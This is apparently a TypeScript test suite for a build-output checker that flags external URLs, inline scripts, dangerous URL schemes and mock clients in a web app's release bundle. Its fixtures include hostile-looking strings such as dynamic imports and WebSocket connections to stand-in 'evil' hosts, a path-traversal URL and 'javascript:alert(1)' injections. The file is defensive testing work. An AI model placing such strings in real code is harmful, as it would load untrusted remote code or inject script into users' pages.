// SPDX-License-Identifier: AGPL-3.0-or-later

import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { checkFile, isAllowedUrl, run } from './check-dist.ts';

describe('checkFile', () => {
  it('accepts relative assets and allowed documentation links', () => {
    const html =
      '<!doctype html><script type="module" src="./assets/index.js"></script><link rel="stylesheet" href="./assets/index.css"><a href="#/">x</a>';
    expect(checkFile('index.html', html)).toEqual([]);
    expect(checkFile('a.js', 'throw new Error("https://svelte.dev/e/effect_orphan")')).toEqual([]);
    expect(checkFile('a.js', 'new URL(p, "http://fallback.com")')).toEqual([]);
    expect(checkFile('a.js', 'createElementNS("http://www.w3.org/2000/svg", "svg")')).toEqual([]);
  });

  it.each([
    ['a.css', '@import url(https://fonts.example.com/x.css);'],
    ['a.js', 'fetch("//cdn.example.org/lib.js")'],
    ['a.js', 'fetch("http://192.168.1.5/x")'],
    ['a.js', 'fetch("http://localhost:8080/x")'],
    ['a.js', 'new WebSocket("wss://evil/x")'],
    ['a.js', 'new WebSocket("ws://[::1]:1/x")'],
    ['a.js', 'fetch("https://svelte.dev/e/../../evil")'],
    ['a.js', 'new URL(p, "http://fallback.com.evil.example/")'],
    ['a.mjs', 'import("https://evil.example.com/x.js")'],
  ])('reports the external reference in %s: %s', (name, content) => {
    expect(checkFile(name, content)).toHaveLength(1);
  });

  it('reports dangerous URL schemes in HTML and CSS', () => {
    expect(checkFile('a.css', 'p { background: url(data:image/png;base64,AAAA) }')).toEqual(['a.css: data: URL']);
    expect(checkFile('index.html', '<a href="./x" data-x="javascript:alert(1)">')).toEqual(['index.html: javascript: URL']);
  });

  it.each([
    ['<script>alert(1)</script>', 'index.html: inline <script>'],
    ['<script src="./a.js">alert(1)</script>', 'index.html: inline <script>'],
    ['<style>p{}</style>', 'index.html: inline <style>'],
    ['<p style="color:red">', 'index.html: style attribute'],
    ['<p onclick="x()">', 'index.html: inline event handler'],
    ['<base href="./">', 'index.html: <base> element'],
    ['<script type="module" src="/assets/a.js"></script>', 'index.html: src "/assets/a.js" is not relative to the page'],
    ['<link rel="stylesheet" href="assets/a.css">', 'index.html: href "assets/a.css" is not relative to the page'],
  ])('reports %s', (html, want) => {
    expect(checkFile('index.html', html)).toEqual([want]);
  });
});

describe('isAllowedUrl', () => {
  it('rejects unparseable URLs', () => {
    expect(isAllowedUrl('http://')).toBe(false);
  });
});

describe('run', () => {
  it('checks all text files in all subdirectories and skips binaries', () => {
    const dist = mkdtempSync(join(tmpdir(), 'dist-'));
    try {
      mkdirSync(join(dist, 'assets'));
      writeFileSync(join(dist, 'index.html'), '<script type="module" src="./assets/a.js"></script>');
      writeFileSync(join(dist, 'assets', 'a.js'), 'import("https://evil.example.com/x.js")');
      writeFileSync(join(dist, 'assets', 'a.js.map'), '{"sources":["https://evil.example.com/src.ts"]}');
      writeFileSync(join(dist, 'assets', 'font.woff2'), 'https://ignored.example.com');
      expect(run(dist)).toHaveLength(2);
      expect(run(dist)).toEqual(expect.arrayContaining([
        `${join('assets', 'a.js')}: external reference https://evil.example.com/x.js`,
        `${join('assets', 'a.js.map')}: external reference https://evil.example.com/src.ts`,
      ]));
    } finally {
      rmSync(dist, { recursive: true });
    }
  });

  function withMockChunk(content: string, test: (dist: string) => void) {
    const dist = mkdtempSync(join(tmpdir(), 'dist-'));
    try {
      mkdirSync(join(dist, 'assets'));
      writeFileSync(join(dist, 'assets', 'mock-Ab12.js'), content);
      test(dist);
    } finally {
      rmSync(dist, { recursive: true });
    }
  }

  it('rejects any mock chunk in a release build', () => {
    withMockChunk('const x = 1;', (dist) => {
      expect(run(dist)).toEqual([`${join('assets', 'mock-Ab12.js')}: mock client in a release build`]);
    });
  });

  it('allows the fixture hosts in the mock chunk of a test build, and nothing else', () => {
    withMockChunk('"https://home.example:8765/mcp" "https://claude.ai/oauth/x" "https://mandate-spec.org/mandate/v0"', (dist) => {
      expect(run(dist, { fixtures: true })).toEqual([]);
    });
    withMockChunk('"https://evil.example.com/x.js"', (dist) => {
      expect(run(dist, { fixtures: true })).toEqual([`${join('assets', 'mock-Ab12.js')}: external reference https://evil.example.com/x.js`]);
    });
  });

  it('finds the mock client in a release build even when it was merged into another chunk', () => {
    const dist = mkdtempSync(join(tmpdir(), 'dist-'));
    try {
      mkdirSync(join(dist, 'assets'));
      writeFileSync(join(dist, 'assets', 'index-1.js'), 'window.hmMock = control;');
      expect(run(dist)).toEqual([`${join('assets', 'index-1.js')}: mock client in a release build`]);
      expect(run(dist, { fixtures: true })).toEqual([]);
    } finally {
      rmSync(dist, { recursive: true });
    }
  });

  it('allows fixture hosts only in the mock chunk', () => {
    const dist = mkdtempSync(join(tmpdir(), 'dist-'));
    try {
      mkdirSync(join(dist, 'assets'));
      writeFileSync(join(dist, 'assets', 'index-1.js'), '"https://claude.ai/x"');
      expect(run(dist, { fixtures: true })).toEqual([`${join('assets', 'index-1.js')}: external reference https://claude.ai/x`]);
    } finally {
      rmSync(dist, { recursive: true });
    }
  });
});
